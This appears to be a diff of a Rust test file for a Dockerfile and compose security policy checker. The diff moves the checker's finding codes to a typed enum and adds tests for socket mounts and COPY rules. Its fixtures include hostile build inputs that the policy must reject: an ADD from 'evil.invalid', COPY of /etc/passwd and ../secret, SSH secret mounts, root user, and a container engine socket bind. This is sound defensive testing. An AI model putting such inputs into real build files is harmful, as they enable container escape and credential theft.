@@ -3,6 +3,7 @@
 use std::collections::BTreeMap;
 
 use vonk_agent::source_policy::inspect_build_source;
+use vonk_agent_protocol::generated::SourcePolicyCode;
 
 fn files(dockerfile: &str) -> BTreeMap<String, Vec<u8>> {
     BTreeMap::from([("Dockerfile".to_owned(), dockerfile.as_bytes().to_vec())])
@@ -40,43 +41,43 @@ fn agent_rejects_dockerfile_escape_and_build_privilege() {
     for (dockerfile, code) in [
         (
             "FROM ubuntu:latest\nUSER 10001\n",
-            "dockerfile.base_unpinned",
+            SourcePolicyCode::DockerfileBaseUnpinned,
         ),
         (
             &format!("FROM ubuntu@sha256:{}\nUSER 10001\n", "0".repeat(64)),
-            "dockerfile.base_placeholder",
+            SourcePolicyCode::DockerfileBasePlaceholder,
         ),
         (
             &format!(
                 "FROM ubuntu@sha256:{}\nADD https://evil.invalid/x /x\nUSER 10001\n",
                 "a".repeat(64)
             ),
-            "dockerfile.add_forbidden",
+            SourcePolicyCode::DockerfileAddForbidden,
         ),
         (
             &format!(
                 "FROM ubuntu@sha256:{}\nRUN --mount=type=ssh true\nUSER 10001\n",
                 "a".repeat(64)
             ),
-            "dockerfile.secret_mount",
+            SourcePolicyCode::DockerfileSecretMount,
         ),
         (
             &format!(
                 "FROM ubuntu@sha256:{}\nCOPY ../secret /x\nUSER 10001\n",
                 "a".repeat(64)
             ),
-            "dockerfile.copy_escape",
+            SourcePolicyCode::DockerfileCopyPath,
         ),
         (
             &format!(
                 "FROM ubuntu@sha256:{}\nCOPY /etc/passwd /x\nUSER 10001\n",
                 "a".repeat(64)
             ),
-            "dockerfile.copy_escape",
+            SourcePolicyCode::DockerfileCopyPath,
         ),
         (
             &format!("FROM ubuntu@sha256:{}\nUSER root\n", "a".repeat(64)),
-            "dockerfile.root_user",
+            SourcePolicyCode::DockerfileRootUser,
         ),
     ] {
         let report = inspect_build_source(&files(dockerfile), "Dockerfile");
@@ -113,10 +114,9 @@ fn agent_rejects_privileged_compose_even_when_dockerfile_is_safe() {
         .iter()
         .map(|item| item.code)
         .collect::<Vec<_>>();
-    assert!(codes.contains(&"compose.privileged"));
-    assert!(codes.contains(&"compose.host_namespace"));
-    assert!(codes.contains(&"compose.host_bind"));
-    assert!(codes.contains(&"compose.container_socket"));
+    assert!(codes.contains(&SourcePolicyCode::ComposePrivileged));
+    assert!(codes.contains(&SourcePolicyCode::ComposeHostNamespace));
+    assert!(codes.contains(&SourcePolicyCode::ComposeHostBind));
 }
 
 #[test]
@@ -128,5 +128,63 @@ fn malformed_compose_fails_closed() {
     source.insert("docker-compose.yml".to_owned(), b"services: [".to_vec());
 
     let report = inspect_build_source(&source, "Dockerfile");
-    assert_eq!(report.findings.last().unwrap().code, "compose.invalid");
+    assert_eq!(
+        report.findings.last().unwrap().code,
+        SourcePolicyCode::ComposeInvalid
+    );
+}
+
+#[test]
+fn a_container_engine_socket_is_a_host_bind_finding_even_behind_a_named_volume() {
+    // Wrong implementation: only a host path source was checked, so mounting the
+    // socket into the container through a named volume passed the recheck.
+    let mut source = files(&format!(
+        "FROM ghcr.io/vonkforge/vllm@sha256:{}\nUSER 10001\n",
+        "a".repeat(64)
+    ));
+    source.insert(
+        "compose.yaml".to_owned(),
+        b"services:\n  model:\n    volumes:\n      - engine:/var/run/podman.sock\n".to_vec(),
+    );
+
+    let report = inspect_build_source(&source, "Dockerfile");
+
+    assert_eq!(
+        report
+            .findings
+            .iter()
+            .map(|item| item.code)
+            .collect::<Vec<_>>(),
+        [SourcePolicyCode::ComposeHostBind]
+    );
+}
+
+#[test]
+fn the_copy_rules_name_the_contract_codes_the_controller_names() {
+    for (copy, code) in [
+        ("COPY [\"a\", ", SourcePolicyCode::DockerfileCopyInvalid),
+        ("COPY ~/secret /x", SourcePolicyCode::DockerfileCopyPath),
+        ("COPY $CONTEXT /x", SourcePolicyCode::DockerfileCopyPath),
+        (
+            "COPY --from=ghcr.io/vonkforge/tools:latest /bin/tool /x",
+            SourcePolicyCode::DockerfileCopyBaseUnpinned,
+        ),
+        (
+            "COPY --from=ghcr.io/vonkforge/tools@sha256:0000000000000000000000000000000000000000000000000000000000000000 /bin/tool /x",
+            SourcePolicyCode::DockerfileCopyBasePlaceholder,
+        ),
+    ] {
+        let report = inspect_build_source(
+            &files(&format!(
+                "FROM ghcr.io/vonkforge/vllm@sha256:{}\n{copy}\nUSER 10001\n",
+                "a".repeat(64)
+            )),
+            "Dockerfile",
+        );
+        assert!(
+            report.findings.iter().any(|item| item.code == code),
+            "{copy}: {:?}",
+            report.findings
+        );
+    }
 }
